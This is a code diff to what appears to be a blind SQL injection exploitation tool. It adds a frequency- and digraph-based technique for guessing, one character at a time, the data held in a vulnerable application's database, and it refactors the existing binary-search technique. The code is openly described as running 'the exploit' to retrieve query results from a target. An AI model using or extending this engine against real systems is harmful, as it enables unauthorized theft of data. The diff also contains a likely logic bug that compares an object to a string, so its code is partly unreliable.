@@ -12,7 +12,11 @@ from gevent.pool import Pool
 from time import time
 from copy import copy
 
-__all__ = ['BooleanBlindTechnique']
+__all__ = ['BooleanBlindTechnique','FrequencyTechnique']
+
+###########
+# Interface
+###########
 
 class Technique(object):
     '''
@@ -36,8 +40,11 @@ class Technique(object):
         raise NotImplemented("technique.run")
 
 
+#########################
+# Binary Search Technique
+#########################
 
-class Character():
+class BlindCharacter(object):
     def __init__(self,row_index,char_index,queue,row_die):
         '''
             :row_index  - what row this character is a part of (for rendering our Query)
@@ -100,7 +107,6 @@ class Character():
                 self.error = True
                 self.row_die.set((self.char_index,AsyncResult()))
                 break
-
 
             gevent.sleep(0)
             
@@ -207,7 +213,7 @@ class BooleanBlindTechnique(Technique):
         this runs in a gevent "thread". It is a worker
         '''
         #keep going until we shut down the technique
-        while True:
+        while not self.shutting_down.is_set():
             #pull the info needed to make a request from the queue
             row_index,char_index,char_val,comparator,char_asyncresult = self.q.get()
 
@@ -239,7 +245,7 @@ class BooleanBlindTechnique(Technique):
 
     def _row_generator(self):
         '''
-        crease rows. mostly useful because it keeps track of row_index
+        Icrease rows. mostly useful because it keeps track of row_index
         '''
         row_index = 0
         while True:
@@ -255,7 +261,7 @@ class BooleanBlindTechnique(Technique):
         char_index = 1
         row_die_event = AsyncResult()
         while True:
-            c = Character(\
+            c = BlindCharacter(\
                 row_index   = row_index,\
                 char_index  = char_index,\
                 queue       = self.q,\
@@ -273,13 +279,16 @@ class BooleanBlindTechnique(Technique):
         while not self.shutting_down.is_set():
             self.results_lock.acquire()
 
-            unused_threads = self.concurrency - reduce(lambda x,row: x + row.count('working'),self.results,0)
-            rows_working = len(filter(lambda row: 'working' in row,self.results))
-            if rows_working == 0:
-                add_to_rows = self.row_len
+            if self.row_len is not None:
+                unused_threads = self.concurrency - reduce(lambda x,row: x + row.count('working'),self.results,0)
+                rows_working = len(filter(lambda row: 'working' in row,self.results))
+                if rows_working == 0:
+                    add_to_rows = self.row_len
+                else:
+                    add_to_rows = unused_threads//rows_working
+                    add_to_rows = [add_to_rows,1][add_to_rows==0]
             else:
-                add_to_rows = unused_threads//rows_working
-                add_to_rows = [add_to_rows,1][add_to_rows==0]
+                add_to_rows = 1
 
             for row_index in range(len(self.results)):
                 #if the row isn't finished or hasn't been started yet, we add Character()s to the row
@@ -292,7 +301,10 @@ class BooleanBlindTechnique(Technique):
         '''
         look at how many gevent "threads" are being used and add more rows to correct this
         '''
-        rows_to_work_on = self.concurrency // self.row_len
+        if self.row_len is not None:
+            rows_to_work_on = self.concurrency // self.row_len
+        else:
+            rows_to_work_on = self.concurrency
         rows_to_work_on = [rows_to_work_on,1][rows_to_work_on == 0]
         while not self.shutting_down.is_set():
             # add rows until we realize that we are at the end of rows
@@ -341,7 +353,7 @@ class BooleanBlindTechnique(Technique):
         gevent.killall(self.request_makers)
         gevent.joinall(self.request_makers)
 
-    def run(self,user_query,concurrency=20,row_len=2,sleep=0):
+    def run(self,user_query,row_len=None,concurrency=20,sleep=0):
         '''
         run the exploit. returns the data retreived.
             :user_query     this is the query whose result we are trying to get out of the vulnerable application. 
@@ -410,3 +422,92 @@ class BooleanBlindTechnique(Technique):
         status += "req/char: %f\t" % rc
 
         return status
+
+
+###########################
+# Frequency Based Technique
+###########################
+
+class FrequencyCharacter(BlindCharacter):
+    def __init__(self,previous_char,*args,**kwargs):
+        self.previous_char = previous_char
+        super(FrequencyCharacter,self).__init__(*args,**kwargs)
+
+    def run(self):
+        #make note of the current greenlet
+        self.run_gl = gevent.getcurrent()
+
+        self.working = True        
+
+        tried = []
+        chars_to_try = copy(characters_by_freq)
+        previous_char_finished = False
+
+        success = False
+
+        while not success and len(chars_to_try):
+            if not previous_char_finished and self.previous_char and self.previous_char == "success":
+                chars_to_try = filter(lambda c: c not in tried,diagraphs[self.previous_char.char_val])
+                previous_char_finished = True
+
+            self.char_val = chars_to_try.pop(0)
+
+            if self._test("="):
+                success = True
+
+            tried.append(self.char_val)
+
+            gevent.sleep(0)
+
+        if not success:
+            self.error = True
+            self.row_die.set((self.char_index,AsyncResult()))
+            
+        self.done = True
+        self.working = False
+
+        #clear the note regarding the running greenlet
+        self.run_gl = None
+
+
+class FrequencyTechnique(BooleanBlindTechnique):
+    def _character_generator(self,row_index):
+        '''
+        creates a Character object for us. this generator is useful just because it keeps track of the char_index
+        '''
+        char_index = 1
+        row_die_event = AsyncResult()
+
+        previous_char = None
+
+        while True:
+            c = FrequencyCharacter(\
+                row_index     = row_index,\
+                char_index    = char_index,\
+                queue         = self.q,\
+                row_die       = row_die_event,\
+                previous_char = previous_char)
+            # note the previous char
+            previous_char = c
+            #increment our char_index
+            char_index += 1
+            #fire off the Character within our Pool.
+            self.character_pool.spawn(c.run)
+            yield c
+
+    def _adjust_row_lengths(self):
+        ''' 
+        if a row is full of "success", but we havent reached the end yet (the last elt isnt "error")
+        then we need to increase the row_len.
+        '''
+        while not self.shutting_down.is_set():
+            self.results_lock.acquire()
+
+            for row_index in range(len(self.results)):
+                #if the row isn't finished or hasn't been started yet, we add Character()s to the row
+                if not len(self.results[row_index]) or ('error' not in self.results[row_index] and self.results[row_index][-1] == "success"):
+                    self.results[row_index].append(self.char_gens[row_index].next())
+
+            self.results_lock.release()
+            gevent.sleep(.3)
+
